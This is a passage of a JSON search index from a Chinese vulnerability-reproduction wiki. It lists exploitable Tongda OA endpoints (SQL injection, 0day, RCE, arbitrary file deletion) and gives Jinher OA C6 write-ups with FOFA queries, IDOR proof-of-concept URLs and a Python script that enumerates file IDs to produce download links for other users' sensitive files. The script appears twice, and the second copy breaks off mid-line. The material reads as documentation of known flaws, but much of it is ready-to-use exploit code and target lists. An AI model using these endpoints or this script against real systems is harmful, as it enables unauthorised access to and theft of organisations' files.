\u53c2\u6570username\u3001email \u53ef\u7206\u7528\u6237\u3001\u90ae\u7bb1 http[s]://TongDaOA.domain/resque/worker.php \u8ba1\u7b97\u673a\u540d","title":"\u901a\u8fbeOA\u4fe1\u606f\u6536\u96c6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#2013-2017sqli-path","text":"http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php","title":"2013-2017(SQLi path)"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#v11v116-0day","text":"http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php","title":"v11~v11.6 [0day]"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#v116-rce","text":"http[s]://TongDaOA.domain/module/appbuilder/assets/print.php \u4efb\u610f\u6587\u4ef6\u5220\u9664","title":"v11.6 [RCE]"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#\u53c2\u8003\u6587\u7ae0","text":"\u901a\u8fbeOA\u6f0f\u6d1e\u4e00\u4e9b\u6f0f\u6d1e\u70b9(Github)","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u91d1\u548cOA C6 \u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u91d1\u548cOA C6 \u5b58\u5728\u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u666e\u901a\u7528\u6237\u767b\u5f55\u540e\u53ef\u4ee5\u901a\u8fc7\u904d\u5386ID\u7f16\u53f7\u83b7\u53d6\u7ba1\u7406\u5458\u53ca\u5176\u4ed6\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u91d1\u548cOA C6 FOFA \u00b6 [!NOTE] app=\"Jinher-OA\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528\u666e\u901a\u7528\u6237\u767b\u5f55 OA\u5e94\u7528\u540e\u53f0 \u8bbf\u95ee\u7684POC\u4e3a http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330 [!NOTE] \u6ce8\u610f RY120330 \u9700\u8981\u4e3a\u786e\u5b9a\u7684\u5176\u4ed6\u7684\u7528\u6237\u7f16\u53f7 \u6cc4\u9732\u4e86\u90e8\u5206\u7684\u654f\u611f\u4fe1\u606f \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA","title":"\u91d1\u548cOA C6 \u540e\u53f0\u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u91d1\u548coa-c6-\u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"\u91d1\u548cOA C6 \u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u91d1\u548cOA C6 \u5b58\u5728\u8d8a\u6743\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u666e\u901a\u7528\u6237\u767b\u5f55\u540e\u53ef\u4ee5\u901a\u8fc7\u904d\u5386ID\u7f16\u53f7\u83b7\u53d6\u7ba1\u7406\u5458\u53ca\u5176\u4ed6\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u91d1\u548cOA C6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"Jinher-OA\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528\u666e\u901a\u7528\u6237\u767b\u5f55 OA\u5e94\u7528\u540e\u53f0 \u8bbf\u95ee\u7684POC\u4e3a http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330 [!NOTE] \u6ce8\u610f RY120330 \u9700\u8981\u4e3a\u786e\u5b9a\u7684\u5176\u4ed6\u7684\u7528\u6237\u7f16\u53f7 \u6cc4\u9732\u4e86\u90e8\u5206\u7684\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","text":"\u91d1\u548cOA C6 \u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u91d1\u548cOA C6 \u5b58\u5728\u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e\uff0c\u666e\u901a\u7528\u6237\u901a\u8fc7\u904d\u5386\u7279\u6b8a\u53c2\u6570\u53ef\u4ee5\u83b7\u53d6\u5176\u4ed6\u7528\u6237\u4e0a\u4f20\u7684\u654f\u611f\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u91d1\u548cOA C6 FOFA \u00b6 [!NOTE] app=\"Jinher-OA\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u70b9\u51fb\u4fe1\u606f\u4ea4\u6d41\uff0c\u53d1\u8d77\u534f\u540c\u9875\u9762 \u4e0a\u4f20\u9644\u4ef6\u5e76\u4e0a\u4f20\u53d1\u9001\u7ed9\u76ee\u6807 [!NOTE] \u8fd9\u91cc\u767b\u5f55\u6743\u9650\u4e3a\u7ba1\u7406\u5458\uff0c\u6211\u4eec\u81ea\u5df1\u53d1\u7ed9\u81ea\u5df1\u5c31\u597d\uff0c\u524d\u6587\u53ea\u662f\u5c55\u73b0\u6f0f\u6d1e\u6316\u6398\u601d\u8def\u8fc7\u7a0b \u6210\u529f\u6536\u5230\u4e0a\u4f20\u7684\u9644\u4ef6 \u70b9\u51fb\u67e5\u770b\u65f6\u6293\u5305\uff0c\u53d1\u73b0\u4e00\u4e2a\u5e26\u6709\u6587\u4ef6ID\u7684\u8bf7\u6c42\u5305 \u8fd4\u56de\u4e86\u51e0\u4e2a\u53c2\u6570 var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; \u5176\u4e2d\u6211\u4eec\u6ce8\u610f\u5230 strFilePath \u4e3a\u6587\u4ef6\u7684\u5b58\u50a8\u5730\u5740\uff0c\u6211\u4eec\u66f4\u6539 id\u53c2\u6570\u4e3a\u53e6\u4e00\u4e2a\u503c\uff0c\u4e14\u6d4b\u8bd5\u540e\u53d1\u73b0 name\u6587\u4ef6\u540d\u53c2\u6570\u65e0\u5173\u7d27\u8981 \u66f4\u6539ID\u540e\u53d1\u9001\u8bf7\u6c42\u5305\u53d1\u73b0\u83b7\u5f97\u53e6\u4e00\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f \u8bbf\u95eeUrl\uff0c\u6ce8\u610f **type\u53c2\u6570 ** \u9700\u8981\u4e3a\u6b63\u786e\u7684\u6587\u4ef6\u540e\u7f00\u624d\u53ef\u4ee5\u8bbf\u95ee http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf \u8fd9\u91cc\u66f4\u6362\u4e00\u4e2a\u666e\u901a\u7528\u6237\u6d4b\u8bd5\u662f\u5426\u53ef\u884c\uff0c\u5c1d\u8bd5\u904d\u5386 id \u5b58\u5728 strFilePath\u53c2\u6570 \u5219\u662f\u5b58\u5728\u6587\u4ef6\uff0c\u4e3a\u7a7a\u5219\u662f\u6587\u4ef6\u5df2\u7ecf\u4e0d\u5b58\u5728 \u540c\u65f6\u6293\u5305\u4e0b\u8f7d\u6587\u4ef6\u9875\u9762\u4e5f\u53ef\u4ee5\u770b\u5230\u53ef\u83b7\u53d6\u7684\u53c2\u6570 FileID \u4e0e FileIDCode \u4e8e\u662f\u53ea\u9700\u8981\u901a\u8fc7\u521a\u521a\u7684ID\u904d\u5386\uff0c\u83b7\u53d6\u4e24\u4e2a\u5173\u952e\u53c2\u6570\u5c31\u80fd\u4e0b\u8f7d\u5176\u4ed6\u4eba\u53d1\u9001\u7684\u654f\u611f\u6587\u4ef6\uff0c\u4e14\u53ea\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u53ea\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u4e14\u6f0f\u6d1e\u5b58\u5728\u4e8e\u540e\u53f0\u9700\u8981\u767b\u5f55 \u8fd0\u884c\u540e\u8bbf\u95ee\u94fe\u63a5\u5373\u53ef\u4e0b\u8f7d\u6587\u4ef6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u91d1\u548cOA C6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_id , cookie ): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id= {} &name=&type=pdf\" . format ( file_id ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Cookie\" : cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 Url: {} \\033 [0m\" . format ( vuln_url )) if \"strFilePath =\" in response . text and response . status_code == 200 : strFilePath = re . findall ( r \"var strFilePath = '(.*?)';\" , response . text )[ 0 ] strFileType = strFilePath [ - 3 :] strFileIDCode = re . findall ( r \"var strFileIDCode='(.*?)';\" , response . text )[ 0 ] strId = re . findall ( r \"var strId = '(.*?)';\" , response . text )[ 0 ] sid = re . findall ( r 'ASP.NET_SessionId=(.*?);' , cookie )[ 0 ] if strFilePath != \"\" : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u83b7\u53d6\u6587\u4ef6\u4fe1\u606f: \\n [o] \u6587\u4ef6\u8def\u5f84\uff1a {} \\n [o] \u6587\u4ef6\u7c7b\u578b\uff1a {} \\n [o] \u6587\u4ef6ID code\uff1a {} \\n [o] \u6587\u4ef6\u7f16\u53f7\uff1a {} \\033 [0m\" . format ( target_url , strFilePath , strFileType , strFileIDCode , strId )) print ( \" \\033 [32m[o] \u6587\u4ef6\u4e0b\u8f7d\u94fe\u63a5\u4e3a: {} /C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID= {} &FileIDCode= {} &sid= {} \" . format ( target_url , strId , strFileIDCode , sid )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u6587\u4ef6\u4e0d\u5b58\u5728 \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_id = str ( input ( \" \\033 [35mFile_id >>> \\033 [0m\" )) cookie = str ( input ( \" \\033 [35mCookie >>> \\033 [0m\" )) POC_1 ( target_url , file_id , cookie )","title":"\u91d1\u548cOA C6 \u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u91d1\u548coa-c6-\u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e","text":"","title":"\u91d1\u548cOA C6 \u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u91d1\u548cOA C6 \u5b58\u5728\u540e\u53f0\u8d8a\u6743\u654f\u611f\u6587\u4ef6\u904d\u5386\u6f0f\u6d1e\uff0c\u666e\u901a\u7528\u6237\u901a\u8fc7\u904d\u5386\u7279\u6b8a\u53c2\u6570\u53ef\u4ee5\u83b7\u53d6\u5176\u4ed6\u7528\u6237\u4e0a\u4f20\u7684\u654f\u611f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u91d1\u548cOA C6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"Jinher-OA\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u540e\u70b9\u51fb\u4fe1\u606f\u4ea4\u6d41\uff0c\u53d1\u8d77\u534f\u540c\u9875\u9762 \u4e0a\u4f20\u9644\u4ef6\u5e76\u4e0a\u4f20\u53d1\u9001\u7ed9\u76ee\u6807 [!NOTE] \u8fd9\u91cc\u767b\u5f55\u6743\u9650\u4e3a\u7ba1\u7406\u5458\uff0c\u6211\u4eec\u81ea\u5df1\u53d1\u7ed9\u81ea\u5df1\u5c31\u597d\uff0c\u524d\u6587\u53ea\u662f\u5c55\u73b0\u6f0f\u6d1e\u6316\u6398\u601d\u8def\u8fc7\u7a0b \u6210\u529f\u6536\u5230\u4e0a\u4f20\u7684\u9644\u4ef6 \u70b9\u51fb\u67e5\u770b\u65f6\u6293\u5305\uff0c\u53d1\u73b0\u4e00\u4e2a\u5e26\u6709\u6587\u4ef6ID\u7684\u8bf7\u6c42\u5305 \u8fd4\u56de\u4e86\u51e0\u4e2a\u53c2\u6570 var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; \u5176\u4e2d\u6211\u4eec\u6ce8\u610f\u5230 strFilePath \u4e3a\u6587\u4ef6\u7684\u5b58\u50a8\u5730\u5740\uff0c\u6211\u4eec\u66f4\u6539 id\u53c2\u6570\u4e3a\u53e6\u4e00\u4e2a\u503c\uff0c\u4e14\u6d4b\u8bd5\u540e\u53d1\u73b0 name\u6587\u4ef6\u540d\u53c2\u6570\u65e0\u5173\u7d27\u8981 \u66f4\u6539ID\u540e\u53d1\u9001\u8bf7\u6c42\u5305\u53d1\u73b0\u83b7\u5f97\u53e6\u4e00\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f \u8bbf\u95eeUrl\uff0c\u6ce8\u610f **type\u53c2\u6570 ** \u9700\u8981\u4e3a\u6b63\u786e\u7684\u6587\u4ef6\u540e\u7f00\u624d\u53ef\u4ee5\u8bbf\u95ee http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf \u8fd9\u91cc\u66f4\u6362\u4e00\u4e2a\u666e\u901a\u7528\u6237\u6d4b\u8bd5\u662f\u5426\u53ef\u884c\uff0c\u5c1d\u8bd5\u904d\u5386 id \u5b58\u5728 strFilePath\u53c2\u6570 \u5219\u662f\u5b58\u5728\u6587\u4ef6\uff0c\u4e3a\u7a7a\u5219\u662f\u6587\u4ef6\u5df2\u7ecf\u4e0d\u5b58\u5728 \u540c\u65f6\u6293\u5305\u4e0b\u8f7d\u6587\u4ef6\u9875\u9762\u4e5f\u53ef\u4ee5\u770b\u5230\u53ef\u83b7\u53d6\u7684\u53c2\u6570 FileID \u4e0e FileIDCode \u4e8e\u662f\u53ea\u9700\u8981\u901a\u8fc7\u521a\u521a\u7684ID\u904d\u5386\uff0c\u83b7\u53d6\u4e24\u4e2a\u5173\u952e\u53c2\u6570\u5c31\u80fd\u4e0b\u8f7d\u5176\u4ed6\u4eba\u53d1\u9001\u7684\u654f\u611f\u6587\u4ef6\uff0c\u4e14\u53ea\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u53ea\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u4e14\u6f0f\u6d1e\u5b58\u5728\u4e8e\u540e\u53f0\u9700\u8981\u767b\u5f55 \u8fd0\u884c\u540e\u8bbf\u95ee\u94fe\u63a5\u5373\u53ef\u4e0b\u8f7d\u6587\u4ef6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u91d1\u548cOA C6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_id , cookie ): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id= {} &name=&type=pdf\" . format ( file_id ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Cookie\" : cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 Url: {} \\033 [0m\" . format ( vuln_url )) if \"strFilePath =\" in response . text and response . status_code == 200 : strFilePath = re . findall ( r \"var strFilePath = '(.*?)';\" , response . text )[ 0 ] strFileType = strFilePath [ - 3 :] strFileIDCode = re . findall ( r \"var strFileIDCode='(.*?)';\" , response . text )[ 0 ] strId = re . findall ( r \"var strId = '(.*?)';\" , response . text )[ 0 ] sid = re . findall ( r 'ASP.NET_SessionId=(.*?);' , cookie )[ 0 ] if strFilePath != \"\" : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u83b7\u53d6\u6587\u4ef6\u4fe1\u606f: \\n [o] \u6587\u4ef6\u8def\u5f84\uff1a {} \\n [o] \u6587\u4ef6\u7c7b\u578b\uff1a {} \\n [o] \u6587\u4ef6ID code\uff1a {} \\n [o] \u6587\u4ef6\u7f16\u53f7\uff1a {} \\033 [0m\" . format ( target_url , strFilePath , strFileType , strFileIDCode , strId )) print ( \" \\033 [32m[o] \u6587\u4ef6\u4e0b\u8f7d\u94fe\u63a5\u4e3a: {} /C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID= {} &FileIDCode= {} &sid= {} \" . format ( target_url , strId , strFileIDCode , sid )) else : print ( \" \\033 [31m[x] 